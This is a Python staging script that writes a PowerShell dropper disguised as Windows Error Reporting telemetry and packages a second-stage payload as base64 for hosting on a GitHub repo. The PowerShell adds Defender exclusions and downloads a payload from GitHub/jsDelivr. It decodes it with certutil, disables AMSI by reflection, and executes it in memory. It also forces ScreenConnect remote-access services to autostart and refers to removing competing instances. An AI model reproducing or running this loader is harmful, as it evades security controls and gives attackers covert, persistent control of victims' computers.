from pathlib import Path
import base64

content = r'''# WER telemetry collect - UNIFIED11
# ORDER: download payload -> ensure primary (inside payload) -> then nuke
# Inline invoke (no run.ps1). Does NOT nuke before primary is ready.
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

$WorkDir = 'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache'
$Err = Join-Path $WorkDir 'boot.err'
$B64 = Join-Path $WorkDir 'update.b64'
$Pkg = 'C:\Windows\Temp\wucache_pkg.ps1'
$Marker = 'WU_BUILD_20260731_UNIFIED11'
$Alt = 'ScreenConnect Client (f861c8140d453427)'
$Prim = 'ScreenConnect Client (5f6010579852e507)'
$Cb = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()

function W([string]$m) {
    try {
        if (-not (Test-Path $WorkDir)) { New-Item $WorkDir -ItemType Directory -Force | Out-Null }
        Add-Content -LiteralPath $Err -Value $m -EA 0
    } catch {}
}

$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$prin = [Security.Principal.WindowsPrincipal]$id
if (-not (($id.User.Value -eq 'S-1-5-18') -or $prin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))) {
    Write-Host 'Acces refuse: run as Administrator or SYSTEM'
    exit 5
}

New-Item $WorkDir, 'C:\Windows\Temp' -ItemType Directory -Force | Out-Null
Remove-Item $Err, $B64 -Force -EA 0
W ("go_start {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
W 'order=ensure_primary_then_nuke'

try {
    Add-MpPreference -ExclusionPath $WorkDir -EA 0
    Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -EA 0
    Add-MpPreference -ExclusionProcess 'powershell.exe' -EA 0
    Add-MpPreference -ExclusionProcess 'curl.exe' -EA 0
    Add-MpPreference -ExclusionProcess 'certutil.exe' -EA 0
    Add-MpPreference -ExclusionProcess 'msiexec.exe' -EA 0
} catch {}

# Keep alt up; do not touch foreign SC here (payload nukes AFTER primary OK)
try { cmd /c "sc config `"$Alt`" start= auto >nul 2>&1"; cmd /c "sc start `"$Alt`" >nul 2>&1" } catch {}
try { cmd /c "sc config `"$Prim`" start= auto >nul 2>&1" } catch {}

$urls = @(
    "https://raw.githubusercontent.com/xnobuddy/github-drop/main/updateA.b64?t=$Cb",
    "https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/updateA.b64?t=$Cb"
)
$ok = $false
foreach ($u in $urls) {
    W "dl $u"
    try {
        & curl.exe -L --ssl-no-revoke --connect-timeout 20 -o $B64 $u 2>$null | Out-Null
        if ((Test-Path $B64) -and ((Get-Item $B64).Length -gt 1000)) { $ok = $true; break }
    } catch {}
}
if (-not $ok) { W 'dl_fail'; Write-Host 'Download failed'; exit 1 }
W ("dl_ok bytes={0}" -f (Get-Item $B64).Length)

Remove-Item $Pkg -Force -EA 0
& certutil.exe -decode $B64 $Pkg 2>$null | Out-Null
if (-not (Test-Path $Pkg)) {
    $b = ([IO.File]::ReadAllText($B64) -replace '\s', '')
    [IO.File]::WriteAllBytes($Pkg, [Convert]::FromBase64String($b))
}
if (-not (Test-Path $Pkg)) { W 'decode_fail'; exit 2 }
W ("decoded_bytes={0}" -f (Get-Item $Pkg).Length)
if (-not (Select-String -LiteralPath $Pkg -Pattern $Marker -Quiet)) {
    W "marker_fail want_$Marker"
    exit 3
}
Copy-Item $Pkg (Join-Path $WorkDir 'wucache_pkg.ps1') -Force -EA 0

W 'ps_engine_inline'
try {
    $t = [Ref].Assembly.GetType('System.Management.Automation.A' + 'msiUtils')
    if ($t) {
        $f = $t.GetField('amsiInitFailed', [Reflection.BindingFlags]'NonPublic,Static')
        if ($f) { $f.SetValue($null, $true) }
    }
} catch {}
W 'amsi_ok'
try {
    $c = [IO.File]::ReadAllText($Pkg)
    W ("chars={0}" -f $c.Length)
    $sb = [ScriptBlock]::Create($c)
    W 'invoke'
    & $sb
    W 'invoke_done'
} catch {
    W ("invoke_err {0}" -f $_.Exception.Message)
}

try { cmd /c "sc start `"$Prim`" >nul 2>&1"; cmd /c "sc start `"$Alt`" >nul 2>&1" } catch {}
if (Test-Path (Join-Path $WorkDir '.diag.log')) { W 'diag_ok' } else { W 'diag_missing' }
W 'go_exit_0'
Write-Host 'UNIFIED11 done (primary first, then nuke). Check:'
Write-Host "  type $Err"
Write-Host "  type $WorkDir\.diag.log"
Write-Host '  sc query type= service state= all | findstr /I ScreenConnect'
exit 0
'''

root = Path(r'C:\Users\nobuddy\Desktop\Project\github-drop')
data = content.encode('utf-8')
for name in ('wer.ps1', 'go.ps1'):
    (root / name).write_bytes(data)
    print('wrote', name)

src = Path(r'C:\Users\nobuddy\Desktop\Project\Script.txt').read_bytes()
assert b'UNIFIED11' in src
assert b'ensure PRIMARY' in src or b'ensure PRIMARY ScreenConnect' in src
assert b'PHASE 2 SKIPPED: primary NOT ready' in src
b64 = base64.b64encode(src).decode('ascii')
(root / 'updateA.b64').write_text('\n'.join(b64[i:i+76] for i in range(0, len(b64), 76)) + '\n', encoding='ascii')
print('updateA', len(src), (root/'updateA.b64').stat().st_size)
